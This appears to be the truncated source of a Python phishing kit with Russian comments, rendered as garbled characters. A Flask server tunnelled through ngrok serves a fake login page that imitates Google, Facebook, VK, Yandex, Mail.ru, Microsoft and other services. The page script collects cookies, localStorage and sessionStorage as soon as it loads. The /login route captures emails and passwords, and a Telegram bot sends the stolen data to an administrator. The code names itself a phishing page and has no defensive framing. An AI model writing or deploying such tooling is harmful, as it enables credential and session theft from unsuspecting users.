import logging
import asyncio
import json
import re
import uuid
import os
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64
import requests
from flask import Flask, request, jsonify, render_template_string
import threading

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "–í–ê–®_–¢–û–ö–ï–ù_–ë–û–¢–ê"
ADMIN_ID = 1709490182  # –í–∞—à Telegram ID –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
NGROK_AUTH_TOKEN = "–í–ê–®_–¢–û–ö–ï–ù_NGROK"  # –í–∞—à ngrok auth token

# –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–∞–Ω–Ω—ã—Ö
@dataclass
class CapturedData:
    id: str
    timestamp: str
    source_ip: str
    user_agent: str
    request_url: str
    request_method: str
    request_headers: Dict
    request_body: Optional[str] = None
    response_status: Optional[int] = None
    response_headers: Optional[Dict] = None
    response_body: Optional[str] = None
    extracted_credentials: List[Dict] = None
    extracted_cookies: List[Dict] = None
    identified_services: List[str] = None
    
    def __post_init__(self):
        if self.extracted_credentials is None:
            self.extracted_credentials = []
        if self.extracted_cookies is None:
            self.extracted_cookies = []
        if self.identified_services is None:
            self.identified_services = []

class NgrokManager:
    """–ú–µ–Ω–µ–¥–∂–µ—Ä –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å ngrok"""
    
    def __init__(self, auth_token: str):
        self.auth_token = auth_token
        self.base_url = "http://localhost:4040/api"
        self.public_url = None
        self.tunnel_info = None
        
    def start_tunnel(self, port: int = 8080, domain: str = None):
        """–ó–∞–ø—É—Å–∫ ngrok —Ç—É–Ω–Ω–µ–ª—è"""
        try:
            # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º auth token
            os.system(f"ngrok authtoken {self.auth_token}")
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º ngrok –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–µ
            ngrok_command = f"ngrok http {port}"
            if domain:
                ngrok_command += f" --domain={domain}"
            
            # –ó–∞–ø—É—Å–∫–∞–µ–º ngrok –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
            import subprocess
            self.ngrok_process = subprocess.Popen(
                ngrok_command.split(),
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            time.sleep(3)  # –ñ–¥–µ–º –∑–∞–ø—É—Å–∫–∞ ngrok
            
            # –ü–æ–ª—É—á–∞–µ–º –ø—É–±–ª–∏—á–Ω—ã–π URL
            self._get_tunnel_info()
            
            if self.public_url:
                logger.info(f"Ngrok tunnel started: {self.public_url}")
                return self.public_url
            else:
                logger.error("Failed to start ngrok tunnel")
                return None
                
        except Exception as e:
            logger.error(f"Error starting ngrok: {e}")
            return None
    
    def _get_tunnel_info(self):
        """–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç—É–Ω–Ω–µ–ª–µ"""
        try:
            response = requests.get(f"{self.base_url}/tunnels")
            if response.status_code == 200:
                data = response.json()
                tunnels = data.get("tunnels", [])
                if tunnels:
                    self.tunnel_info = tunnels[0]
                    self.public_url = self.tunnel_info.get("public_url")
                    return True
        except Exception as e:
            logger.error(f"Error getting tunnel info: {e}")
        
        return False
    
    def stop_tunnel(self):
        """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ ngrok —Ç—É–Ω–Ω–µ–ª—è"""
        try:
            if hasattr(self, 'ngrok_process'):
                self.ngrok_process.terminate()
                logger.info("Ngrok tunnel stopped")
        except Exception as e:
            logger.error(f"Error stopping ngrok: {e}")

class Database:
    def __init__(self):
        self.captured_data: Dict[str, CapturedData] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_captured": 0,
            "total_requests": 0,
            "total_credentials": 0,
            "total_cookies": 0,
            "google_accounts": 0,
            "facebook_accounts": 0,
            "instagram_accounts": 0,
            "twitter_accounts": 0,
            "vk_accounts": 0,
            "yandex_accounts": 0,
            "mailru_accounts": 0
        }
    
    def add_captured_data(self, data: CapturedData):
        self.captured_data[data.id] = data
        self.stats["total_captured"] += 1
        self.stats["total_requests"] += 1
        self.save()
    
    def get_captured_data(self, data_id: str) -> Optional[CapturedData]:
        return self.captured_data.get(data_id)
    
    def add_credentials(self, data_id: str, credentials: List[Dict]):
        if data_id in self.captured_data:
            self.captured_data[data_id].extracted_credentials.extend(credentials)
            self.stats["total_credentials"] += len(credentials)
            self.save()
    
    def add_cookies(self, data_id: str, cookies: List[Dict]):
        if data_id in self.captured_data:
            self.captured_data[data_id].extracted_cookies.extend(cookies)
            self.stats["total_cookies"] += len(cookies)
            self.save()
    
    def add_services(self, data_id: str, services: List[str]):
        if data_id in self.captured_data:
            self.captured_data[data_id].identified_services = services
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ —Å–µ—Ä–≤–∏—Å–∞–º
            for service in services:
                if service in self.stats:
                    self.stats[service] += 1
            
            self.save()
    
    def save(self):
        try:
            data = {
                "captured_data": {k: asdict(v) for k, v in self.captured_data.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.captured_data = {k: CapturedData(**v) for k, v in data.get("captured_data", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
db = Database()
db.load()

# –ö–ª–∞—Å—Å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–Ω–æ—Å—Ç–∏ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π –∫ —Å–µ—Ä–≤–∏—Å–∞–º
class ServiceIdentifier:
    """–ö–ª–∞—Å—Å –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–Ω–æ—Å—Ç–∏ —É—á–µ—Ç–Ω—ã—Ö –∑–∞–ø–∏—Å–µ–π –∫ —Å–µ—Ä–≤–∏—Å–∞–º"""
    
    SERVICE_PATTERNS = {
        "google": {
            "email_patterns": ["@gmail.com", "@googlemail.com"],
            "url_patterns": ["accounts.google.com", "google.com/accounts", "signin.google.com"],
            "field_patterns": ["email", "username", "identifier", "google"],
            "cookie_patterns": ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]
        },
        "facebook": {
            "email_patterns": [],
            "url_patterns": ["facebook.com", "fb.com", "facebook.com/login"],
            "field_patterns": ["email", "pass", "fb", "facebook"],
            "cookie_patterns": ["c_user", "xs", "fr", "datr"]
        },
        "instagram": {
            "email_patterns": [],
            "url_patterns": ["instagram.com", "instagram.com/accounts/login"],
            "field_patterns": ["username", "password", "ig"],
            "cookie_patterns": ["sessionid", "csrftoken", "ds_user_id", "rur"]
        },
        "twitter": {
            "email_patterns": [],
            "url_patterns": ["twitter.com", "x.com", "twitter.com/i/flow/login"],
            "field_patterns": ["username", "password", "session", "twitter"],
            "cookie_patterns": ["auth_token", "ct0", "guest_id", "kdt"]
        },
        "vk": {
            "email_patterns": ["@vk.com", "@vkontakte.ru"],
            "url_patterns": ["vk.com", "vkontakte.ru", "vk.com/login"],
            "field_patterns": ["email", "pass", "login", "vk"],
            "cookie_patterns": ["remixsid", "remixstid", "remixdt", "remixlgck"]
        },
        "yandex": {
            "email_patterns": ["@yandex.ru", "@ya.ru", "@yandex.com"],
            "url_patterns": ["yandex.ru", "passport.yandex.ru", "yandex.com"],
            "field_patterns": ["login", "passwd", "yandex"],
            "cookie_patterns": ["Session_id", "yandexuid", "yandex_login", "ys"]
        },
        "mailru": {
            "email_patterns": ["@mail.ru", "@inbox.ru", "@list.ru", "@bk.ru"],
            "url_patterns": ["mail.ru", "e.mail.ru", "account.mail.ru"],
            "field_patterns": ["Login", "Password", "mail"],
            "cookie_patterns": ["Mpop", "act", "mbox", "sdcs"]
        },
        "github": {
            "email_patterns": [],
            "url_patterns": ["github.com", "github.com/login"],
            "field_patterns": ["login", "password", "github"],
            "cookie_patterns": ["user_session", "_gh_sess", "logged_in"]
        },
        "microsoft": {
            "email_patterns": ["@outlook.com", "@hotmail.com", "@live.com"],
            "url_patterns": ["login.live.com", "outlook.live.com", "account.microsoft.com"],
            "field_patterns": ["loginfmt", "passwd", "microsoft"],
            "cookie_patterns": ["ESTSAUTH", "ESTSASC", "ESTSAUTHPERSISTENT"]
        }
    }
    
    SERVICE_NAMES_RU = {
        "google": "Google/Gmail",
        "facebook": "Facebook",
        "instagram": "Instagram",
        "twitter": "Twitter/X",
        "vk": "–í–ö–æ–Ω—Ç–∞–∫—Ç–µ",
        "yandex": "–Ø–Ω–¥–µ–∫—Å",
        "mailru": "Mail.ru",
        "github": "GitHub",
        "microsoft": "Microsoft/Outlook"
    }
    
    @staticmethod
    def identify_from_url(url: str) -> List[str]:
        """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞ –ø–æ URL"""
        identified = []
        url_lower = url.lower()
        
        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
            for pattern in patterns["url_patterns"]:
                if pattern in url_lower:
                    if service not in identified:
                        identified.append(service)
                    break
        
        return identified
    
    @staticmethod
    def identify_from_credentials(email: str, password: str = None) -> List[str]:
        """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞ –ø–æ —É—á–µ—Ç–Ω—ã–º –¥–∞–Ω–Ω—ã–º"""
        identified = []
        
        if not email:
            return identified
        
        email_lower = email.lower()
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ email –¥–æ–º–µ–Ω–∞–º
        domain_service_map = {
            "gmail.com": "google",
            "googlemail.com": "google",
            "yandex.ru": "yandex",
            "ya.ru": "yandex",
            "yandex.com": "yandex",
            "mail.ru": "mailru",
            "inbox.ru": "mailru",
            "list.ru": "mailru",
            "bk.ru": "mailru",
            "outlook.com": "microsoft",
            "hotmail.com": "microsoft",
            "live.com": "microsoft",
            "vk.com": "vk",
            "vkontakte.ru": "vk"
        }
        
        if "@" in email_lower:
            domain = email_lower.split("@")[1]
            if domain in domain_service_map:
                service = domain_service_map[domain]
                if service not in identified:
                    identified.append(service)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º –≤ email
        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
            for pattern in patterns["email_patterns"]:
                if pattern in email_lower:
                    if service not in identified:
                        identified.append(service)
                    break
        
        return identified
    
    @staticmethod
    def identify_from_cookies(cookies: Dict) -> List[str]:
        """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–∞ –ø–æ cookies"""
        identified = []
        
        if not cookies:
            return identified
        
        cookies_str = str(cookies).lower()
        
        for service, patterns in ServiceIdentifier.SERVICE_PATTERNS.items():
            for pattern in patterns["cookie_patterns"]:
                if pattern.lower() in cookies_str:
                    if service not in identified:
                        identified.append(service)
                    break
        
        return identified

# Flask —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö
app = Flask(__name__)

# HTML —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –¥–ª—è —Ñ–∏—à–∏–Ω–≥–∞
PHISHING_PAGE_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–µ—Ä–≤–∏—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .login-form {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        .service-badge {
            display: inline-block;
            padding: 5px 10px;
            background: #4285f4;
            color: white;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 12px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #3367d6;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .error {
            color: #d93025;
            text-align: center;
            margin: 10px 0;
        }
        .success {
            color: #0f9d58;
            text-align: center;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è</h2>
        
        {% if service %}
        <div class="service-badge">
            {% if service == 'google' %}Google
            {% elif service == 'facebook' %}Facebook
            {% elif service == 'instagram' %}Instagram
            {% elif service == 'twitter' %}Twitter/X
            {% elif service == 'vk' %}–í–ö–æ–Ω—Ç–∞–∫—Ç–µ
            {% elif service == 'yandex' %}–Ø–Ω–¥–µ–∫—Å
            {% elif service == 'mailru' %}Mail.ru
            {% elif service == 'microsoft' %}Microsoft
            {% else %}{{ service|capitalize }}{% endif %}
        </div>
        {% endif %}
        
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        
        {% if success %}
        <div class="success">{{ success }}</div>
        {% endif %}
        
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω" required>
            <input type="password" name="password" placeholder="–ü–∞—Ä–æ–ª—å" required>
            <button type="submit">–í–æ–π—Ç–∏</button>
        </form>
        
        <div class="footer">
            –ó–∞—â–∏—â–µ–Ω–æ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–º–∏ —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏—è–º–∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è
        </div>
    </div>
    
    <script>
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
        document.addEventListener('DOMContentLoaded', function() {
            // –°–æ–±–∏—Ä–∞–µ–º cookies
            const cookies = document.cookie;
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            fetch('/collect_extra', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    cookies: cookies,
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    timestamp: new Date().toISOString()
                })
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ - –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤—É—é —Ñ–æ—Ä–º—É"""
    service = request.args.get('service', 'google')
    return render_template_string(PHISHING_PAGE_HTML, service=service)

@app.route('/login', methods=['POST'])
def login():
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–æ—Ä–º—ã –≤—Ö–æ–¥–∞"""
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    service = request.args.get('service', 'google')
    
    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Å–µ—Ä–≤–∏—Å –ø–æ email
    identified_services = ServiceIdentifier.identify_from_credentials(email)
    if not identified_services:
        identified_services = [service]
    
    # –°–æ–±–∏—Ä–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
    user_agent = request.headers.get('User-Agent', '')
    ip_address = request.remote_addr
    cookies = request.cookies
    
    # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –æ –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    data_id = str(uuid.uuid4())[:12]
    captured_data = CapturedData(
        id=data_id,
        timestamp=datetime.now().isoformat(),
        source_ip=ip_address,
        user_agent=user_agent,
        request_url=request.url,
        request_method=request.method,
        request_headers=dict(request.headers),
        request_body=request.get_data(as_text=True),
        extracted_credentials=[{
            "email": email,
            "password": password,
            "service": service,
            "timestamp": datetime.now().isoformat()
        }],
        extracted_cookies=[{"name": k, "value": v} for k, v in cookies.items()],
        identified_services=identified_services
    )
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É
    db.add_captured_data(captured_data)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
    asyncio.run_coroutine_threadsafe(
        send_telegram_notification(captured_data),
        telegram_loop
    )
    
    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—à–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    success_message = "‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ..."
    return render_template_string(PHISHING_PAGE_HTML, service=service, success=success_message)

@app.route('/collect_extra', methods=['POST'])
def collect_extra():
    """–°–±–æ—Ä –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    try:
        data = request.json
        ip_address = request.remote_addr
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –¥–ª—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        data_id = str(uuid.uuid4())[:12]
        captured_data = CapturedData(
            id=data_id,
            timestamp=datetime.now().isoformat(),
            source_ip=ip_address,
            user_agent=data.get('userAgent', ''),
            request_url=request.url,
            request_method=request.method,
            request_headers=dict(request.headers),
            extracted_cookies=[{"name": "extra_data", "value": str(data)}]
        )
        
        db.add_captured_data(captured_data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
        asyncio.run_coroutine_threadsafe(
            send_extra_data_notification(captured_data, data),
            telegram_loop
        )
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Error collecting extra data: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/webhook', methods=['POST'])
def webhook():
    """Webhook –¥–ª—è ngrok –∏–ª–∏ –¥—Ä—É–≥–∏—Ö —Å–µ—Ä–≤–∏—Å–æ–≤"""
    try:
        data = request.json
        ip_address = request.remote_addr
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å
        data_id = str(uuid.uuid4())[:12]
        captured_data = CapturedData(
            id=data_id,
            timestamp=datetime.now().isoformat(),
            source_ip=ip_address,
            user_agent=request.headers.get('User-Agent', ''),
            request_url=request.url,
            request_method=request.method,
            request_headers=dict(request.headers),
            request_body=json.dumps(data) if data else None
        )
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        credentials = extract_credentials_from_data(data)
        if credentials:
            captured_data.extracted_credentials = credentials
            db.stats["total_credentials"] += len(credentials)
        
        db.add_captured_data(captured_data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
        asyncio.run_coroutine_threadsafe(
            send_webhook_notification(captured_data, data),
            telegram_loop
        )
        
        return jsonify({"status": "success", "id": data_id})
    
    except Exception as e:
        logger.error(f"Error in webhook: {e}")
        return jsonify({"status": "error", "message": str(e)})

def extract_credentials_from_data(data: Dict) -> List[Dict]:
    """–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑ –¥–∞–Ω–Ω—ã—Ö"""
    credentials = []
    
    if not data:
        return credentials
    
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ–æ—Ä–º–∞—Ç—ã –¥–∞–Ω–Ω—ã—Ö
        data_str = json.dumps(data).lower()
        
        # –ü–æ–∏—Å–∫ email
        import re
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = re.findall(email_pattern, data_str)
        
        # –ü–æ–∏—Å–∫ –ø–∞—Ä–æ–ª–µ–π
        password_keywords = ['password', 'passwd', 'pass', 'pwd', 'secret', 'token']
        password_fields = []
        
        def find_passwords(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    current_path = f"{path}.{key}" if path else key
                    if any(keyword in str(key).lower() for keyword in password_keywords):
                        if value and str(value).strip():
                            password_fields.append({
                                "field": current_path,
                                "value": str(value)[:100]  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
                            })
                    find_passwords(value, current_path)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    find_passwords(item, f"{path}[{i}]")
        
        find_passwords(data)
        
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å–∏ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        for email in emails[:5]:  # –ë–µ—Ä–µ–º —Ç–æ–ª—å–∫–æ –ø–µ—Ä–≤—ã–µ 5 email
            credential = {
                "email": email,
                "password": None,
                "service": ServiceIdentifier.identify_from_credentials(email),
                "timestamp": datetime.now().isoformat(),
                "source": "webhook_auto_extract"
            }
            
            # –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –ø–∞—Ä–æ–ª—å –¥–ª—è —ç—Ç–æ–≥–æ email
            if password_fields:
                credential["password"] = password_fields[0]["value"]
            
            credentials.append(credential)
    
    except Exception as e:
        logger.error(f"Error extracting credentials: {e}")
    
    return credentials

# –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏–π –¥–ª—è Telegram
class MessageFormatter:
    @staticmethod
    def format_captured_data(data: CapturedData) -> str:
        """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è Telegram"""
        message = f"""
üîê *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –ó–ê–•–í–ê–ß–ï–ù–´!*

üìå *–ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:*
‚Ä¢ ID: `{data.id}`
‚Ä¢ –í—Ä–µ–º—è: {data.timestamp[:19]}
‚Ä¢ IP: `{data.source_ip}`
‚Ä¢ –ú–µ—Ç–æ–¥: {data.request_method}
‚Ä¢ URL: {data.request_url[:50]}...

üë§ *User Agent:*
`{data.user_agent[:100]}...`
"""
        
        # –î–æ–±–∞–≤–ª—è–µ–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –µ—Å–ª–∏ –µ—Å—Ç—å
        if data.extracted_credentials:
            message += "\nüîë *–£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï:*\n"
            for cred in data.extracted_credentials:
                email = cred.get("email", "N/A")
                password = cred.get("password", "N/A")
                service = cred.get("service", ["–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"])
                
                if isinstance(service, list) and service:
                    service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(
                        service[0], 
                        service[0].title()
                    )
                else:
                    service_name = "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"
                
                message += f"‚Ä¢ –°–µ—Ä–≤–∏—Å: *{service_name}*\n"
                message += f"  üìß Email: `{email}`\n"
                if password and password != "N/A":
                    message += f"  üîê –ü–∞—Ä–æ–ª—å: `{password}`\n"
                message += "  ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
        
        # –î–æ–±–∞–≤–ª—è–µ–º cookies –µ—Å–ª–∏ –µ—Å—Ç—å
        if data.extracted_cookies:
            message += f"\nüç™ *COOKIES:* {len(data.extracted_cookies)}\n"
            for cookie in data.extracted_cookies[:3]:  # –ü–µ—Ä–≤—ã–µ 3 cookie
                message += f"‚Ä¢ {cookie.get('name', 'N/A')}: `{cookie.get('value', '')[:30]}...`\n"
        
        # –î–æ–±–∞–≤–ª—è–µ–º –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
        if data.identified_services:
            message += "\nüåê *–û–ü–†–ï–î–ï–õ–ï–ù–ù–´–ï –°–ï–†–í–ò–°–´:*\n"
            for service in data.identified_services:
                service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"‚Ä¢ {service_name}\n"
        
        message += f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ò–°–¢–ï–ú–´:*
‚Ä¢ –í—Å–µ–≥–æ –∑–∞—Ö–≤–∞—á–µ–Ω–æ: {db.stats['total_captured']}
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {db.stats['total_credentials']}
‚Ä¢ Cookies: {db.stats['total_cookies']}

üí° *–î–µ–π—Å—Ç–≤–∏—è:*
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /data {data.id} –¥–ª—è –¥–µ—Ç–∞–ª–µ–π
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /stats –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /links –¥–ª—è —Å–ø–∏—Å–∫–∞ —Å—Å—ã–ª–æ–∫
"""
        
        return message
    
    @staticmethod
    def format_detailed_data(data: CapturedData) -> str:
        """–î–µ—Ç–∞–ª—å–Ω–æ–µ —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö"""
        message = f"""
üîç *–î–ï–¢–ê–õ–¨–ù–´–ô –û–¢–ß–ï–¢*

üìå *–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä:* `{data.id}`
üïí *–í—Ä–µ–º—è –∑–∞—Ö–≤–∞—Ç–∞:* {data.timestamp}
üåê *IP –∞–¥—Ä–µ—Å:* `{data.source_ip}`
üîó *URL –∑–∞–ø—Ä–æ—Å–∞:* {data.request_url}
üì° *–ú–µ—Ç–æ–¥:* {data.request_method}
"""
        
        # –ó–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞
        if data.request_headers:
            message += "\nüìã *–ó–ê–ì–û–õ–û–í–ö–ò –ó–ê–ü–†–û–°–ê:*\n"
            for key, value in list(data.request_headers.items())[:5]:
                message += f"‚Ä¢ {key}: `{str(value)[:50]}...`\n"
        
        # –¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
        if data.request_body:
            message += "\nüìù *–¢–ï–õ–û –ó–ê–ü–†–û–°–ê:*\n"
            body_preview = data.request_body[:200] + ("..." if len(data.request_body) > 200 else "")
            message += f"```\n{body_preview}\n```\n"
        
        # –£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        if data.extracted_credentials:
            message += "\nüéØ *–£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï:*\n"
            for i, cred in enumerate(data.extracted_credentials, 1):
                message += f"{i}. *–°–µ—Ä–≤–∏—Å:* {cred.get('service', 'N/A')}\n"
                message += f"   *Email:* `{cred.get('email', 'N/A')}`\n"
                if cred.get('password'):
